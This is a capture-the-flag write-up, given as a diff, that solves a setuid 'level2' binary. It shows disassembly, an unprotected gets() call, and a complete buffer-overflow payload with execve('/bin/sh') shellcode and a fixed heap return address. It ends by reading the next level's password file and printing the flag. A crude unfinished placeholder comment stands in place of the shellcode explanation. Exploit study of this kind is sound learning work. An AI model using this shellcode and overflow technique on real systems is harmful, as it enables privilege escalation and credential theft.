@@ -1,0 +1,53 @@
+> ls -l level2
+-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
+> ./level2 # Ask an input
+test
+test # Print it
+
+We use > objdump -d level2
+0804853f <main>:
+ 804853f:	55                   	push   %ebp
+ 8048540:	89 e5                	mov    %esp,%ebp
+ 8048542:	83 e4 f0             	and    $0xfffffff0,%esp
+ 8048545:	e8 8a ff ff ff       	call   80484d4 <p>
+# We can see that main call a "p" function
+
+ 80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
+# In the "p" function we can see a call to gets, witch is not protected against buffer overflow
+
+80484fb:	25 00 00 00 b0       	and    $0xb0000000,%eax
+8048500:	3d 00 00 00 b0       	cmp    $0xb0000000,%eax
+# But these two lines are here to protect the return address in the 0xbf000000 - 0xbfffffff range.
+# So we can't use shell code stored in the stack or in environement variable in our return address
+
+8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
+# But here we can see a malloc is used to copy the buffer (still in the "p" function), mallox stores it in the heap!!
+
+> ltrace ./level2
+strdup("")                                                = 0x0804a008
+# After some test we can see that the malloc always return the address 0x0804a008 !
+
+#
+#
+# INSERER ICI EXPLICATION SUR LE FAMEUX SHELLCODE DE MERDE \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80 QUI SORT VISIBLEMENT DE MON ANUS
+# 
+#
+
+# Ok now we need to fin the offset of the return address (eip)
+# GPT PROVIDE THIS NEXT 2 LINES #
+To calculate the offset needed to overwrite the EIP register,
+you can use a pattern generator tool such as
+pattern_create.rb and pattern_offset.rb scripts from the Metasploit framework.
+
+# With it we can figure that the offset is 80
+
+# Our shellcode is 21 bytes so we need 59 bytes of padding before our 4 bytes needed for the return address we found (0x0804a008)
+
+> python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit
+> cat /tmp/exploit - | ./level2
+
+# It worked ! we have now a shell we can use tu get our flag !
+
+> cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
